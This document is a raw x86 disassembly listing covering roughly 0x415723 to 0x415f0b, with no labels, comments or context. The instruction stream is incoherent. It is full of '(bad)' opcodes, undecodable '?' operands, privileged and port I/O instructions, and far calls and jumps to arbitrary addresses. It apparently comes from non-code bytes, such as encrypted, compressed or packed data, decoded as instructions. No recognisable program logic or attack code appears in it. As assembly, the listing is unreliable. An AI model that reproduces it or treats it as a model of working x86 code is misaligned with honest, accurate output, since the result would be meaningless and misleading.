  415723:	scas   eax,DWORD PTR es:[edi]
  415724:	sti    
  415725:	ror    ebp,0x88
  415728:	push   edx
  415729:	stos   DWORD PTR es:[edi],eax
  41572a:	inc    ebx
  41572b:	inc    edx
  41572c:	dec    edi
  41572d:	xor    ch,BYTE PTR [eax-0x56]
  415730:	stos   DWORD PTR es:[edi],eax
  415731:	adc    eax,0x4c414f92
  415736:	mov    ecx,ebx
  415738:	fs xor ebx,esp
  41573b:	cld    
  41573c:	push   edx
  41573d:	jne    0x4156bf
  41573f:	in     eax,dx
  415740:	test   DWORD PTR [esi+edx*8],edx
  415743:	lahf   
  415744:	or     BYTE PTR [ebp-0x4a],al
  415747:	sbb    BYTE PTR [ebx-0x5b],ah
  41574a:	int3   
  41574b:	pop    eax
  41574c:	xor    ah,dl
  41574e:	gs loop 0x415726
  415751:	xchg   ecx,eax
  415752:	xchg   esi,eax
  415753:	sar    edx,cl
  415755:	mov    bh,0xd6
  415757:	sub    BYTE PTR ds:0xa185991f,bh
  41575d:	xchg   ah,ch
  41575f:	cs xor al,0xc9
  415762:	sub    ah,BYTE PTR [edi+0x6b5d75cd]
  415768:	rcl    DWORD PTR [ebx+ebp*4-0x747085ca],cl
  41576f:	dec    eax
  415770:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415771:	and    edx,DWORD PTR [ebx]
  415773:	enter  0xafd9,0xb
  415777:	push   cs
  415778:	enter  0x1df0,0x8c
  41577c:	je     0x415718
  41577e:	test   ecx,0x87d5320f
  415784:	shr    BYTE PTR [edx+0x254c7b15],1
  41578a:	adc    eax,0xd40f5a3a
  41578f:	pop    edx
  415790:	pop    eax
  415791:	out    0xac,al
  415793:	into   
  415794:	adc    ebp,DWORD PTR [eax+0x27]
  415797:	cmp    al,ah
  415799:	in     al,0xc
  41579b:	pop    ss
  41579c:	in     al,dx
  41579d:	pop    es
  41579e:	or     DWORD PTR [esi+0x6c071ded],ebx
  4157a4:	stos   DWORD PTR es:[edi],eax
  4157a5:	jge    0x41576b
  4157a7:	mov    ?,WORD PTR [ebx]
  4157a9:	inc    edi
  4157aa:	sub    DWORD PTR [edx+ecx*2+0x18],ecx
  4157ae:	sub    DWORD PTR [edi],0x11cb9f81
  4157b4:	fst    DWORD PTR [edx+0x1]
  4157b7:	dec    ecx
  4157b8:	fstp   DWORD PTR [ecx-0x6d9225ae]
  4157be:	inc    edi
  4157bf:	stc    
  4157c0:	mov    ds:0xbe4a3748,al
  4157c5:	sub    DWORD PTR [eax-0x14],edx
  4157c8:	inc    esp
  4157c9:	pop    ebp
  4157ca:	popf   
  4157cb:	jg     0x41582a
  4157cd:	shl    esi,cl
  4157cf:	mov    BYTE PTR [esi-0x2535e510],ch
  4157d5:	mov    BYTE PTR [ecx+0x3371f889],ah
  4157db:	jge    0x4157fb
  4157dd:	loope  0x415832
  4157df:	lods   eax,DWORD PTR ds:[esi]
  4157e0:	cmp    DWORD PTR [edx-0x194b3c30],esi
  4157e6:	call   0x98e74166
  4157eb:	leave  
  4157ec:	mov    BYTE PTR [ecx],ah
  4157ee:	adc    DWORD PTR [edx-0x65],edi
  4157f1:	hlt    
  4157f2:	inc    ebx
  4157f3:	xor    eax,DWORD PTR [eax]
  4157f5:	adc    DWORD PTR ds:0x7c093eb,eax
  4157fb:	jnp    0x4157bd
  4157fd:	xlat   BYTE PTR ds:[ebx]
  4157fe:	mov    edx,0x2d009c99
  415803:	xchg   edx,eax
  415804:	pop    ss
  415805:	mov    dh,0x6b
  415807:	imul   ebx,DWORD PTR [edi],0x8bcf27af
  41580d:	and    al,ch
  41580f:	sub    BYTE PTR [edx-0x31c237ca],ah
  415815:	jmp    0xd5c344b8
  41581a:	mov    al,ds:0x572cab08
  415820:	push   0x641dbc9b
  415825:	lds    ecx,FWORD PTR ds:0x8f43169
  41582b:	cwde   
  41582c:	lods   al,BYTE PTR ds:[esi]
  41582d:	or     ebx,DWORD PTR [eax+0x3d]
  415830:	push   edi
  415831:	xchg   ebp,eax
  415832:	pop    ss
  415833:	adc    eax,0x6ffd63c2
  415838:	mov    esp,0x8df0bc9e
  41583d:	scas   eax,DWORD PTR es:[edi]
  41583e:	jb     0x415893
  415840:	cld    
  415841:	call   0xe2c55a0b
  415846:	enter  0x78d5,0x6e
  41584a:	or     BYTE PTR [eax+0x5a],cl
  41584d:	jle    0x4157d0
  41584f:	mov    eax,0x2995108a
  415854:	or     ah,bh
  415856:	icebp  
  415857:	(bad)  
  415858:	les    esp,FWORD PTR [ebp+0x53]
  41585b:	(bad)  
  41585d:	sbb    DWORD PTR [edx],edi
  41585f:	gs retf 0x2942
  415863:	push   0xffffffdd
  415865:	jns    0x41584e
  415867:	call   0xb15fb678
  41586c:	push   edi
  41586d:	dec    edi
  41586e:	add    ah,ah
  415870:	sbb    esp,edx
  415872:	pop    ebx
  415873:	inc    ebp
  415874:	or     DWORD PTR [ecx-0x791b0e24],ecx
  41587a:	jg     0x4158e9
  41587c:	cmp    al,0xae
  41587e:	or     eax,0x1abe027f
  415883:	mov    eax,ds:0x73e8ccef
  415888:	push   ecx
  415889:	idiv   BYTE PTR [edi]
  41588b:	(bad)  
  41588c:	daa    
  41588d:	enter  0xe871,0xf5
  415891:	loop   0x4158b4
  415893:	test   BYTE PTR [ebp+0x66],bl
  415896:	inc    edx
  415897:	lds    edx,FWORD PTR [ecx]
  415899:	stc    
  41589a:	adc    eax,0xd74d2bfc
  41589f:	shl    esp,cl
  4158a1:	jl     0x41587d
  4158a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158a4:	addr16 (bad) 
  4158a6:	xor    dl,ch
  4158a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158a9:	dec    eax
  4158ab:	xor    edi,0xffffffbf
  4158ae:	daa    
  4158af:	xor    al,0x6f
  4158b1:	(bad)  
  4158b2:	dec    ebp
  4158b3:	ja     0x41592d
  4158b5:	sub    al,BYTE PTR [edx+0x12]
  4158b8:	mov    ebx,0x6e92022f
  4158bd:	add    esp,ebp
  4158bf:	ins    BYTE PTR es:[edi],dx
  4158c0:	xor    al,0x10
  4158c2:	inc    esp
  4158c3:	inc    ecx
  4158c4:	pop    ecx
  4158c5:	ins    BYTE PTR es:[edi],dx
  4158c6:	sub    al,ch
  4158c8:	retf   0x47e4
  4158cb:	sahf   
  4158cc:	shl    DWORD PTR [ecx-0x43],0xde
  4158d0:	pop    edx
  4158d1:	fisttp WORD PTR [esi+0x7d665da6]
  4158d7:	cmp    BYTE PTR [edi],ah
  4158d9:	pop    ss
  4158da:	sub    eax,0xaeef1944
  4158df:	pop    ebp
  4158e0:	mov    bl,0x6e
  4158e2:	fistp  WORD PTR [eax+ecx*8+0x6cd2592e]
  4158e9:	data16 sub al,0x4d
  4158ec:	shl    DWORD PTR [ebp-0x20],1
  4158ef:	out    dx,eax
  4158f0:	iret   
  4158f1:	scas   eax,DWORD PTR es:[edi]
  4158f2:	lds    ebp,FWORD PTR [ebp+0x79acd8ee]
  4158f8:	cwde   
  4158f9:	jp     0x4158f1
  4158fb:	in     al,dx
  4158fc:	wbinvd 
  4158fe:	and    BYTE PTR [ebx-0x3a4b369e],ah
  415904:	loopne 0x415950
  415906:	pop    esp
  415907:	dec    eax
  415908:	jge    0x4158c3
  41590a:	inc    ecx
  41590b:	leave  
  41590c:	cmp    eax,0x291f3ec6
  415911:	push   eax
  415912:	adc    ah,BYTE PTR ds:0xf5473fc3
  415918:	(bad)
  41591b:	cmp    al,0x35
  41591d:	sahf   
  41591e:	gs mov esi,0x9c4acc27
  415924:	push   esi
  415925:	sbb    al,0x5
  415927:	or     DWORD PTR [ecx],0xffffff8e
  41592a:	jae    0x4158e7
  41592c:	sub    eax,0xd03fa559
  415931:	xor    dl,BYTE PTR [edx+0x13]
  415934:	pop    esi
  415935:	iret   
  415936:	mov    ecx,0x2f89f19
  41593b:	shr    DWORD PTR [ecx+0x1b32e7bb],cl
  415941:	nop
  415942:	xor    BYTE PTR [esi+ecx*1-0x50b0f22d],dh
  415949:	cmp    BYTE PTR [ecx+0x46],bh
  41594c:	sahf   
  41594d:	ins    BYTE PTR es:[edi],dx
  41594e:	push   edi
  41594f:	cs ds mov dl,0x5e
  415953:	add    BYTE PTR [edi],bl
  415955:	mov    bh,0x3e
  415957:	cdq    
  415958:	(bad)  
  415959:	ss sub dh,BYTE PTR fs:0x169e081c
  415961:	push   0xdc6604cf
  415966:	lahf   
  415967:	mov    ecx,0x5afdf5ce
  41596c:	(bad)  
  41596d:	sbb    ebp,DWORD PTR gs:[edi]
  415970:	push   esi
  415971:	cdq    
  415972:	mov    ch,0xe6
  415974:	or     DWORD PTR [edx+0x70da60e3],0x4c
  41597b:	xchg   edx,eax
  41597c:	jg     0x4159c4
  41597e:	div    BYTE PTR [ebp+0x3d1f999d]
  415984:	dec    ebp
  415985:	(bad)  [eax]
  415987:	es ret 0x1f45
  41598b:	(bad)  
  41598c:	loop   0x415951
  41598e:	es aaa 
  415990:	pop    esi
  415991:	cs mov dl,0xe4
  415994:	ins    BYTE PTR es:[edi],dx
  415995:	cmp    DWORD PTR [esi+0x79],esp
  415998:	pusha  
  415999:	add    al,0x3e
  41599b:	stc    
  41599c:	adc    al,dh
  41599e:	sti    
  41599f:	call   0x688d:0xc022278f
  4159a6:	frstor [edx]
  4159a8:	xlat   BYTE PTR ds:[ebx]
  4159a9:	fwait
  4159aa:	push   ebx
  4159ab:	mov    ebx,0x16af1bd9
  4159b0:	jle    0x4159cc
  4159b2:	sbb    edi,ecx
  4159b4:	mov    ds,eax
  4159b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159b7:	xchg   ebx,eax
  4159b8:	retf   
  4159b9:	push   edi
  4159ba:	push   edi
  4159bb:	adc    al,0xb7
  4159bd:	xlat   BYTE PTR ds:[ebx]
  4159be:	push   ss
  4159bf:	(bad)  
  4159c0:	out    0xff,al
  4159c2:	repz xor al,0xef
  4159c5:	push   cs
  4159c6:	mov    ds:0x483cc3e5,al
  4159cb:	push   ecx
  4159cc:	adc    esi,DWORD PTR [esi+0x46]
  4159cf:	jmp    0x4159b2
  4159d1:	loope  0x415972
  4159d3:	xchg   ecx,eax
  4159d4:	adc    ebp,ecx
  4159d6:	mov    al,ds:0x2c89e17e
  4159db:	repnz (bad) 
  4159dd:	cs push ss
  4159df:	int3   
  4159e0:	sti    
  4159e1:	enter  0x5dd1,0xc8
  4159e5:	jl     0x415a4e
  4159e7:	mov    cl,0x5a
  4159e9:	js     0x415a07
  4159eb:	test   DWORD PTR [eax+eax*8+0x469ff83b],ebp
  4159f2:	xchg   BYTE PTR [esi],dl
  4159f4:	mov    DWORD PTR [edi],esp
  4159f6:	fiadd  DWORD PTR [ebp-0x57]
  4159f9:	mov    esi,0x16779c48
  4159fe:	pop    es
  4159ff:	lock outs dx,BYTE PTR ds:[esi]
  415a01:	pop    edx
  415a02:	lds    esi,FWORD PTR [ecx+0x141f363a]
  415a08:	dec    edx
  415a09:	scas   eax,DWORD PTR es:[edi]
  415a0a:	pop    ds
  415a0b:	shl    BYTE PTR [esi-0x5d52790c],0x51
  415a12:	pushf  
  415a13:	inc    ebx
  415a14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a15:	or     BYTE PTR [edx+edi*8+0xa],ch
  415a19:	jnp    0x415a5d
  415a1b:	stc    
  415a1c:	or     edx,DWORD PTR [esi-0x20eb7f31]
  415a22:	add    eax,0x4d393a39
  415a27:	icebp  
  415a28:	das    
  415a29:	mov    dl,0x9e
  415a2b:	std    
  415a2c:	and    edx,DWORD PTR [ebx+0x1d]
  415a2f:	cdq    
  415a30:	sbb    DWORD PTR [edi],edi
  415a32:	inc    BYTE PTR [edx]
  415a34:	fistp  WORD PTR [ecx]
  415a36:	test   bl,0xcf
  415a39:	clc    
  415a3a:	add    DWORD PTR [edi+0x26d62011],esi
  415a40:	sub    DWORD PTR [edx+0xbabaf82],0x51e44d45
  415a4a:	cmp    eax,0xbe68b713
  415a4f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a51:	out    dx,al
  415a52:	rcr    BYTE PTR [edx+0x1cbcda17],cl
  415a58:	mov    WORD PTR [ebp-0x58],?
  415a5b:	ds inc ebx
  415a5d:	stc    
  415a5e:	jle    0x415a20
  415a60:	mov    BYTE PTR [ebx+0x1339ea8d],bl
  415a66:	pop    esp
  415a67:	je     0x415a30
  415a69:	push   edi
  415a6a:	push   ebx
  415a6b:	xchg   esp,eax
  415a6c:	mov    dh,0x20
  415a6e:	mov    esp,0x60b4533d
  415a73:	(bad)  
  415a74:	iret   
  415a75:	push   ebx
  415a76:	daa    
  415a77:	jbe    0x415a7e
  415a79:	add    esi,DWORD PTR [edx+0x3]
  415a7c:	leave  
  415a7d:	(bad)  
  415a7e:	je     0x415a9a
  415a80:	scas   eax,DWORD PTR es:[edi]
  415a81:	inc    ebx
  415a82:	lahf   
  415a83:	sahf   
  415a84:	mov    BYTE PTR [ebx+0x64],al
  415a87:	arpl   di,sp
  415a89:	mov    ds:0xf2b43a7,al
  415a8e:	pop    ds
  415a8f:	xchg   esi,eax
  415a90:	sahf   
  415a91:	cmp    BYTE PTR [esp+eax*2+0x11],0x3a
  415a96:	iret   
  415a97:	push   edx
  415a98:	cmp    edx,DWORD PTR [ecx]
  415a9a:	and    eax,0xdf1c96f8
  415a9f:	stc    
  415aa0:	leave  
  415aa1:	ret    0x522
  415aa4:	mov    ecx,0x4603442c
  415aa9:	ror    edi,cl
  415aab:	aam    0xeb
  415aad:	sbb    dl,BYTE PTR [eax+0x79]
  415ab0:	arpl   WORD PTR [ebx],si
  415ab2:	mov    eax,0x4f1a5e09
  415ab7:	in     eax,0x5
  415ab9:	sub    al,0x34
  415abb:	pop    esi
  415abc:	sub    esp,edx
  415abe:	pop    ss
  415abf:	test   DWORD PTR [ecx],esi
  415ac1:	ins    BYTE PTR es:[edi],dx
  415ac2:	out    dx,eax
  415ac3:	and    BYTE PTR [ebx+0x47],ah
  415ac6:	sbb    al,0xf8
  415ac8:	adc    DWORD PTR [ebx],eax
  415aca:	dec    ebx
  415acb:	push   0x5a503458
  415ad0:	mov    DWORD PTR [edi+eiz*2+0x40],eax
  415ad4:	and    bh,al
  415ad6:	shl    DWORD PTR [edx],0xf4
  415ad9:	mov    ch,0x3d
  415adb:	or     al,0xed
  415add:	cmp    dh,bh
  415adf:	ret    
  415ae0:	out    dx,al
  415ae1:	sti    
  415ae2:	and    al,0xe3
  415ae4:	aaa    
  415ae5:	fstp   TBYTE PTR [edx]
  415ae7:	cmp    al,0x76
  415aea:	(bad)  
  415aeb:	cli    
  415aec:	movlps xmm4,QWORD PTR [esi]
  415aef:	xor    esi,DWORD PTR [edi]
  415af1:	(bad)  
  415af2:	inc    BYTE PTR [eax+ebp*8]
  415af5:	sbb    edi,esp
  415af7:	and    bl,BYTE PTR [edi+edx*4+0x23]
  415afb:	icebp  
  415afc:	and    dh,bl
  415afe:	dec    BYTE PTR [eax+0x79c6198f]
  415b04:	daa    
  415b05:	mov    ah,0x86
  415b07:	pop    eax
  415b08:	cmp    eax,0xb39a3650
  415b0d:	das    
  415b0e:	pop    ebp
  415b0f:	loopne 0x415b64
  415b11:	sahf   
  415b12:	mov    ebp,0x230ec04a
  415b17:	and    eax,0xbe5ab51c
  415b1c:	pop    esi
  415b1d:	sub    eax,0x2820a345
  415b22:	xchg   ecx,eax
  415b23:	call   edi
  415b25:	sbb    al,0x70
  415b27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b28:	or     edx,DWORD PTR [edi]
  415b2a:	jmp    0x8b208804
  415b2f:	dec    esp
  415b31:	inc    esp
  415b32:	mov    eax,0x647e8dbd
  415b37:	adc    al,0xb2
  415b39:	add    eax,0x6ad99109
  415b3e:	jle    0x415b57
  415b40:	fdivrp st(5),st
  415b42:	(bad)  ds:0x47e4895a
  415b48:	and    edi,ecx
  415b4a:	pop    eax
  415b4b:	(bad)  
  415b4c:	cmp    BYTE PTR [ebp+0x58f101ed],ah
  415b52:	js     0x415ae9
  415b54:	push   DWORD PTR [edi-0x31]
  415b57:	icebp  
  415b58:	mov    ds:0xbe5159ad,eax
  415b5d:	push   0x4e
  415b5f:	push   esi
  415b60:	push   ebx
  415b61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b62:	xchg   BYTE PTR [ecx],al
  415b64:	cwde   
  415b65:	gs dec ebp
  415b67:	jle    0x415b8c
  415b69:	les    ebx,FWORD PTR ds:0x6b06da17
  415b6f:	int    0x6e
  415b71:	push   ebx
  415b72:	addr16 and al,0x6d
  415b75:	aaa    
  415b76:	or     DWORD PTR [eax-0x37],edi
  415b79:	mov    ebx,0x56b041bd
  415b7e:	je     0x415b17
  415b80:	bound  ecx,QWORD PTR [edx+0x1c]
  415b83:	icebp  
  415b84:	ret    
  415b85:	xchg   al,ch
  415b87:	test   al,0x81
  415b89:	add    BYTE PTR [eax-0x59fb9e52],ch
  415b8f:	test   BYTE PTR [eax-0x35],0xad
  415b93:	mov    ecx,0x69df53cc
  415b98:	and    BYTE PTR [edx+0x730c9403],ch
  415b9e:	mov    edi,0x1c81b1a4
  415ba3:	aam    0xaa
  415ba5:	cs mov dl,0x15
  415ba8:	cwde   
  415ba9:	dec    esp
  415baa:	shl    DWORD PTR [edx+ebx*8],1
  415bad:	inc    edi
  415bae:	mov    cl,0x54
  415bb0:	cld    
  415bb1:	aam    0x7d
  415bb3:	or     esi,esp
  415bb5:	aas    
  415bb6:	add    BYTE PTR [eax],bh
  415bb8:	ret    0xac1e
  415bbb:	push   ebp
  415bbc:	jecxz  0x415bd2
  415bbe:	mov    esp,0xa0e97b22
  415bc3:	add    eax,0xf134645
  415bc8:	scas   al,BYTE PTR es:[edi]
  415bc9:	div    ecx
  415bcb:	sbb    al,0x71
  415bcd:	call   0x94cefba6
  415bd2:	inc    ecx
  415bd3:	ins    BYTE PTR es:[edi],dx
  415bd4:	xor    dh,BYTE PTR [edx]
  415bd6:	mov    fs,WORD PTR [edx-0x6d]
  415bd9:	and    al,0x8c
  415bdb:	inc    ecx
  415bdc:	xchg   esi,eax
  415bdd:	popf   
  415bde:	push   ds
  415bdf:	push   ebp
  415be0:	mov    eax,0xe4658c5d
  415be5:	ins    DWORD PTR es:[edi],dx
  415be6:	pop    ebx
  415be7:	lock sbb esp,DWORD PTR [ecx+0x20db312d]
  415bee:	sbb    cl,0xbe
  415bf1:	push   DWORD PTR [ebp-0x477abed5]
  415bf7:	dec    ebp
  415bf8:	xchg   esp,eax
  415bf9:	pop    ebp
  415bfa:	jbe    0x415c20
  415bfc:	mov    ebx,0xc606eb0
  415c01:	xor    eax,0x2dfeb03e
  415c06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c07:	aas    
  415c08:	cmp    al,0x89
  415c0a:	pop    ebp
  415c0b:	pop    ss
  415c0c:	cmp    eax,0x491d3def
  415c11:	sbb    eax,0xe1b304da
  415c16:	int3   
  415c17:	test   DWORD PTR [edi-0x25652fb6],ebx
  415c1d:	and    eax,0x6a63f8b5
  415c22:	loope  0x415bfa
  415c24:	in     al,0x6b
  415c26:	(bad)  
  415c27:	addr16 pop ss
  415c29:	xor    eax,0x309047f7
  415c2e:	leave  
  415c2f:	add    esp,DWORD PTR [eax]
  415c31:	jns    0x415c7e
  415c33:	jl     0x415bd5
  415c35:	in     al,dx
  415c36:	lea    esp,[eax-0x28453238]
  415c3c:	mov    ds:0x7a4a0b9b,al
  415c41:	std    
  415c42:	mov    esi,0x92232a8
  415c47:	fsub   DWORD PTR [edi+0x2f94e268]
  415c4d:	addr16 data16 std 
  415c50:	lock or eax,0x259f349d
  415c56:	test   DWORD PTR [edx-0x62e4ae34],esp
  415c5c:	mov    eax,0x273ed337
  415c61:	lds    edx,FWORD PTR [ebp-0x7c521ba1]
  415c67:	inc    esi
  415c68:	push   eax
  415c69:	xlat   BYTE PTR es:[ebx]
  415c6b:	call   0x51a1:0xcea6583b
  415c72:	lods   al,BYTE PTR ds:[esi]
  415c73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c74:	iret   
  415c75:	push   ss
  415c76:	enter  0x1686,0x39
  415c7a:	pop    eax
  415c7b:	sbb    DWORD PTR [ebp-0x510263ae],0x3f552b9d
  415c85:	out    0xaf,al
  415c87:	mov    ds:0x862558c2,al
  415c8c:	shr    BYTE PTR [eax],0xed
  415c8f:	adc    dl,BYTE PTR [ebx]
  415c91:	addr16 mov bh,0x6d
  415c94:	mov    al,ds:0x70ebae95
  415c99:	je     0x415c60
  415c9b:	push   esp
  415c9c:	dec    esi
  415c9d:	pop    edx
  415c9e:	test   eax,0x83c1642f
  415ca3:	les    ecx,FWORD PTR [esi-0x798644d4]
  415ca9:	out    0x12,al
  415cab:	mov    esp,0x8f84b446
  415cb0:	dec    esi
  415cb1:	xor    al,0x45
  415cb3:	retf   0x435a
  415cb6:	lds    esi,FWORD PTR [edi]
  415cb8:	dec    ebp
  415cb9:	mov    DWORD PTR [edi],ecx
  415cbb:	sub    ebx,DWORD PTR [edx+eax*1]
  415cbe:	pop    ebp
  415cbf:	hlt    
  415cc0:	test   DWORD PTR [ebx-0x21967283],ebp
  415cc6:	das    
  415cc7:	test   DWORD PTR [edx+0x23],0xd9a7f9d1
  415cce:	neg    BYTE PTR [edx+0x7dbb11c]
  415cd4:	sub    BYTE PTR [eax],ah
  415cd6:	rep ins DWORD PTR es:[edi],dx
  415cd8:	sahf   
  415cd9:	xchg   ebp,esp
  415cdb:	pusha  
  415cdc:	and    DWORD PTR [ecx+0x67],0x1f2b31b3
  415ce3:	aam    0xe
  415ce5:	into   
  415ce6:	scas   al,BYTE PTR es:[edi]
  415ce7:	mov    edx,0xcbf07de7
  415cec:	xor    BYTE PTR [eax-0x246a4e77],bh
  415cf2:	xchg   ebp,eax
  415cf3:	cld    
  415cf4:	pop    esi
  415cf5:	push   cs
  415cf6:	cmc    
  415cf7:	int    0xbf
  415cf9:	adc    DWORD PTR [edi+0x744d63e9],0xcf82cad7
  415d03:	fdiv   QWORD PTR [edi+0x58292c69]
  415d09:	pop    es
  415d0a:	xlat   BYTE PTR ds:[ebx]
  415d0b:	mov    bh,0xd
  415d0d:	cmp    ebp,ebx
  415d0f:	xor    DWORD PTR [ebx+0x376f168e],ebx
  415d15:	adc    eax,0xd25cbe63
  415d1a:	rol    DWORD PTR [ecx],cl
  415d1c:	pop    es
  415d1d:	jmp    0x11e1:0x9176c0c8
  415d24:	clc    
  415d25:	mov    BYTE PTR [ebx+0x43d0a64d],ah
  415d2b:	fwait
  415d2c:	pop    ecx
  415d2d:	dec    ecx
  415d2e:	push   edx
  415d2f:	out    dx,al
  415d30:	inc    esi
  415d31:	mov    ch,0xf4
  415d33:	add    BYTE PTR gs:[ebp+0x7772f3ce],bl
  415d3a:	scas   al,BYTE PTR es:[edi]
  415d3b:	or     al,0x45
  415d3d:	cmp    al,BYTE PTR [ebp+eiz*8-0x3c3e969f]
  415d44:	ins    DWORD PTR es:[edi],dx
  415d45:	into   
  415d46:	mov    dh,BYTE PTR [ebp+0x4d]
  415d49:	shl    DWORD PTR [edi+0x4e],1
  415d4c:	es mov ch,0x71
  415d4f:	or     dh,bh
  415d51:	in     eax,0x99
  415d53:	add    DWORD PTR [esi],eax
  415d55:	cmp    dh,0x72
  415d58:	int3   
  415d59:	xchg   DWORD PTR [ecx-0x4a3eb634],esi
  415d5f:	call   0xafd7:0x7a6d79bb
  415d66:	sti    
  415d67:	imul   eax,DWORD PTR [ecx+edi*8-0x9a84f52],0x3d0b6411
  415d72:	cmp    ebp,DWORD PTR [edx+0x4e]
  415d75:	dec    edx
  415d76:	ins    BYTE PTR es:[edi],dx
  415d77:	dec    ebp
  415d78:	imul   edi,DWORD PTR [eax],0x5e9349f8
  415d7e:	loop   0x415d38
  415d80:	repnz imul al
  415d83:	daa    
  415d84:	push   ss
  415d85:	xchg   ecx,eax
  415d86:	dec    edi
  415d87:	(bad)  
  415d88:	push   0xffffffe4
  415d8a:	dec    edx
  415d8b:	mul    DWORD PTR [ecx]
  415d8d:	jb     0x415d25
  415d8f:	xchg   ecx,eax
  415d90:	mov    DWORD PTR [eax+edi*1+0x61],0x40bd2ee8
  415d98:	in     al,0x6e
  415d9a:	ficom  WORD PTR [ebp-0x51]
  415d9d:	js     0x415de1
  415d9f:	fcom   st(5)
  415da1:	add    esp,0xffffffa3
  415da4:	mov    ds,esi
  415da6:	sar    BYTE PTR [ecx+0x6c],1
  415da9:	icebp  
  415daa:	(bad)  
  415dab:	repnz sar DWORD PTR [ecx+ebp*1],1
  415daf:	push   ecx
  415db0:	fisub  DWORD PTR [eax+0x27]
  415db3:	jno    0x415d3e
  415db5:	mov    al,0x67
  415db7:	dec    edx
  415db8:	jno    0x415d77
  415dba:	push   esi
  415dbb:	sbb    BYTE PTR [ebx+0x2660945d],cl
  415dc1:	add    dh,bl
  415dc3:	ror    edi,cl
  415dc5:	int    0xf1
  415dc7:	dec    ebp
  415dc8:	int3   
  415dc9:	fstp   TBYTE PTR [ebp-0x2e]
  415dcc:	sub    DWORD PTR [ebx+0x7c7262b3],edi
  415dd2:	mov    ch,0xe2
  415dd4:	push   esp
  415dd5:	in     eax,0xd0
  415dd7:	mov    ah,BYTE PTR [edx-0x6e81ead9]
  415ddd:	shr    al,cl
  415ddf:	xchg   ebx,eax
  415de0:	loop   0x415dfd
  415de2:	ja     0x415dc4
  415de4:	ss adc dh,ah
  415de7:	xchg   DWORD PTR [esi],ebp
  415de9:	mov    eax,ds:0xbe38e07f
  415dee:	retf   0x1f51
  415df1:	pop    eax
  415df2:	cli    
  415df3:	cmc    
  415df4:	fmul   st(3),st
  415df6:	add    BYTE PTR [ebx],ah
  415df8:	add    ah,BYTE PTR [eax+0x1546246]
  415dfe:	cmp    BYTE PTR [edi-0x7],cl
  415e01:	test   eax,0x96b12f26
  415e06:	(bad)  
  415e07:	push   0xe8a93872
  415e0c:	jmp    0xf48c070d
  415e11:	lahf   
  415e12:	iret   
  415e13:	inc    esp
  415e14:	test   BYTE PTR [edx],0x3d
  415e17:	push   cs
  415e18:	aad    0x47
  415e1a:	call   0x3d8dd917
  415e1f:	sti    
  415e20:	leave  
  415e21:	push   es
  415e22:	sub    dl,0xa3
  415e25:	adc    dh,BYTE PTR [eax]
  415e27:	mov    esp,0x28ee6baa
  415e2c:	js     0x415eab
  415e2e:	jecxz  0x415e42
  415e30:	aad    0x1a
  415e32:	sub    eax,DWORD PTR [eax+0x7]
  415e35:	mov    dh,bh
  415e37:	cs sbb edi,ecx
  415e3a:	dec    eax
  415e3b:	mov    al,ds:0x7107c265
  415e40:	js     0x415e31
  415e42:	dec    edi
  415e43:	lods   al,BYTE PTR ds:[esi]
  415e44:	fidiv  DWORD PTR [edx-0x44]
  415e47:	dec    esp
  415e48:	outs   dx,DWORD PTR ds:[esi]
  415e49:	fld    QWORD PTR [eax]
  415e4b:	sub    bh,BYTE PTR [ecx+0x5f]
  415e4e:	mov    dl,0x30
  415e50:	scas   eax,DWORD PTR es:[edi]
  415e51:	inc    esp
  415e52:	arpl   WORD PTR [eax-0x1d],di
  415e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e56:	cwde   
  415e57:	inc    esp
  415e58:	jmp    0x6948:0x2cfaa68a
  415e5f:	aad    0x6b
  415e61:	test   al,0xa3
  415e63:	leave  
  415e64:	jno    0x415ea6
  415e66:	lock push edx
  415e68:	test   BYTE PTR [ebx+0x3989de77],ah
  415e6e:	les    edi,FWORD PTR ds:0x51326613
  415e74:	loope  0x415e7c
  415e76:	enter  0x526b,0x21
  415e7a:	push   eax
  415e7b:	push   edi
  415e7c:	fwait
  415e7d:	push   edi
  415e7e:	push   ds
  415e7f:	push   eax
  415e80:	mov    edi,0x4a44d812
  415e85:	dec    ebx
  415e86:	mov    ebx,0x1680c02
  415e8b:	sub    eax,0xe05f9cfc
  415e90:	jo     0x415f06
  415e92:	in     eax,dx
  415e93:	xchg   bh,dl
  415e95:	cmc    
  415e96:	jbe    0x415edd
  415e98:	shl    BYTE PTR [esi],cl
  415e9a:	cmp    eax,0x1e7ced94
  415e9f:	or     eax,0xbfbf95ac
  415ea4:	(bad)  
  415ea5:	call   0x81b4:0x7bd6b6f2
  415eac:	stc    
  415ead:	push   ss
  415eae:	dec    ebp
  415eaf:	mov    ecx,0x299dcc2a
  415eb4:	pop    ebp
  415eb5:	aam    0xa4
  415eb7:	lahf   
  415eb8:	push   ebp
  415eb9:	jbe    0x415e67
  415ebb:	fadd   DWORD PTR [ebx+0x6f]
  415ebe:	mov    ds:0x420afb1e,al
  415ec3:	mov    ebx,0x35e1f9b8
  415ec8:	(bad)  
  415ec9:	mov    WORD PTR [ebx-0xeb45275],?
  415ecf:	push   0xf45a6aea
  415ed4:	push   ebx
  415ed5:	shr    DWORD PTR [ecx+0x48143b2a],cl
  415edb:	out    0x87,eax
  415edd:	push   edi
  415ede:	pop    esp
  415edf:	cdq    
  415ee0:	scas   eax,DWORD PTR es:[edi]
  415ee1:	repz push esp
  415ee3:	add    al,0x2a
  415ee5:	cli    
  415ee6:	and    cl,BYTE PTR [ecx]
  415ee8:	pushf  
  415ee9:	jg     0x415eca
  415eeb:	fisttp QWORD PTR ds:0xbff8a09f
  415ef1:	sub    eax,0x756ad492
  415ef6:	xchg   ebx,eax
  415ef7:	mov    WORD PTR [ebp-0x1d54174b],fs
  415efd:	fwait
  415efe:	cwde   
  415eff:	call   0x629c3cb9
  415f04:	and    al,0x41
  415f06:	cmp    DWORD PTR [edi+0x31],0xffffff95
  415f0a:	pop    esi
  415f0b:	pop    ss
